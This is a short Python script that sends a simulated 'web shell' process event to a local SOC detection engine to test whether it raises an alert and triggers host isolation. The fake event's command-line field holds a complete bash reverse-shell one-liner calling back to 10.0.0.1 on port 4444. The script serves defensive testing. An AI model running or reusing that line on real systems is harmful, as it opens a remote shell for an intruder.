import requests
import json
import time

BASE_URL = "http://localhost:5000" # Legacy App
AGENT_TOKEN = "your-agent-token" # We'll need a real one or mock it

def simulate_web_shell():
    print("🚀 Starting Web Shell Attack Simulation...")
    
    # Mocking the payload from an agent
    payload = {
        "event_type": "new_process",
        "description": "Interactive shell spawned by web server",
        "severity": "info",
        "raw_data": {
            "user": "www-data",
            "exe": "/bin/bash",
            "pid": 1234,
            "ppid": 80,
            "cmdline": "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"
        }
    }
    
    headers = {
        "X-Agent-Token": "TEST-AGENT-123",
        "Content-Type": "application/json"
    }
    
    try:
        print("📤 Sending malicious event to backend...")
        # Note: We need to make sure the server exists in the DB with this token
        # For simulation, we can just call the SOC platform directly if we want to skip the legacy app
        
        # Calling Detection Engine directly for the demo
        SOC_DETECTION_URL = "http://localhost:8002/events/process"
        
        resp = requests.post(SOC_DETECTION_URL, json={
            "server_id": 1,
            "hostname": "PROD-WEB-01",
            "type": "new_process",
            "description": "Interactive shell spawned by www-data",
            "raw_data": payload["raw_data"]
        })
        
        if resp.status_code == 200:
            print("✅ Event processed by SOC platform.")
            print("🔍 Check logs/UI for: 'Suspicious Process Spawned from Web Server'")
            print("🛡️ SOAR should be triggering 'Isolate Host' for Server ID: 1")
        else:
            print(f"❌ Failed: {resp.text}")
            
    except Exception as e:
        print(f"❌ Error: {e}")

if __name__ == "__main__":
    simulate_web_shell()
